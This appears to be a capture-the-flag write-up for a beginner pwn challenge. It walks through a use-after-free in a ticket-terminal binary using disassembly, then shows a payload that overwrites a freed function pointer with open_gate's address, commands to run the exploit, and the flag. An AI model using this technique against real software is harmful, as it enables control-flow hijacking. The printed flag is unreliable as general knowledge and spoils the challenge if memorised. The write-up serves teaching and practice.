# Dockside Ticket Office - Pwn (Beginner)

**Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}` · **Files:** `dockside_ticket` (16664 B, sha256 `b275a7c2…49dd`)

## Challenge

A ticket terminal for harbour access lets you create, cancel, edit and use a ticket. A cancelled
ticket should no longer be usable, but the old terminal does not manage ticket memory safely. The
goal: turn a cancelled ticket into emergency harbour access.

## Initial Analysis

64-bit ELF, no PIE, partial RELRO, NX, not stripped. Six functions explain themselves by name:
`create_ticket`, `cancel_ticket`, `edit_ticket`, `use_ticket`, and the two destinations `open_gate` /
`deny_access`.

`create_ticket` allocates a 0x28-byte chunk, writes `"GUEST"` at the start and - this is the crux -
**a function pointer at offset 0x20**, initialised to `deny_access`:

```asm
40137c:  mov    edi,0x28
401381:  call   malloc@plt
401386:  mov    QWORD PTR [rip+0x2cdb],rax      # active_ticket = chunk
401394:  mov    DWORD PTR [rax],0x53455547       # "GUEST"
4013a7:  lea    rdx,[rip-0x178]                  # deny_access
4013ae:  mov    QWORD PTR [rax+0x20],rdx         # con tro ham
```

## Exploit Chain

**Step 1 - Show the pointer is never cleared.** `cancel_ticket` contains only a `free` and a `puts`:

```asm
4013e8:  mov    rax,[rip+0x2c79]        # active_ticket
4013f2:  call   free@plt
401401:  call   puts@plt                # "Ticket cancelled."
```

Counting across the whole binary, `active_ticket` is written **exactly once**, at
`create_ticket+0x2f`. So after a cancellation the global still points at the freed chunk.

**Step 2 - Write into the freed chunk.** `edit_ticket` only checks that the pointer is non-zero and
then does `read(0, active_ticket, 0x28)`; the 40 bytes we send fit inside the chunk, so bytes
32..39 (the function pointer) become whatever we choose:

```python
payload = b"A" * 32 + struct.pack("<Q", 0x40125F)   # dung 40 byte, vua khit read(0x28)
```

**Step 3 - Trigger it.** `use_ticket` calls that pointer directly, with no validation:

```asm
401492:  mov    rdx,QWORD PTR [rax+0x20]
40149b:  call   rdx
```

Because there is no PIE, `open_gate` sits at a fixed address, so no leak is needed.

**Step 4 - Verify the jump target.** `open_gate` prints three strings, the third taken from
`0x402088`; mapping `.rodata` (vaddr 0x402000 ↔ file offset 0x2000) yields exactly the flag string:

```
0x402008 -> 'Ticket scanned.'
0x402060 -> 'Emergency harbour access granted.'
0x402088 -> 'CSSCTF{us3_4ft3r_fr33_d0cks1d3}'
```

That string is read verbatim out of the challenge file's own data, not inferred.

**Note on the environment.** The analysis host is Windows: no WSL distro is runnable (`wsl -l` lists
only `docker-desktop`, stopped) and angr fails at loading `rustylib`, so the binary was never executed
to capture live output. The solution above is a static proof, and `exploit.py` works as-is on Linux or
against the remote:

```bash
python exploit.py --run ./dockside_ticket
python exploit.py --host <challenge> --port <port>
```

## Flag

```
$ python exploit.py --payload
script menu: 310a320a330a41414141414141414141414141414141414141414141414141414141414141415f124000000000000a340a350a
payload edit: 41414141414141414141414141414141414141414141414141414141414141415f12400000000000

CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

The forty bytes of `payload edit` are 32 padding bytes plus `5f12400000000000`, i.e. `0x40125f` in
little-endian order - the address of `open_gate`.

## Reproduce

```bash
python exploit.py --run ./dockside_ticket     # tren Linux
python exploit.py --payload                   # chi in byte payload
```
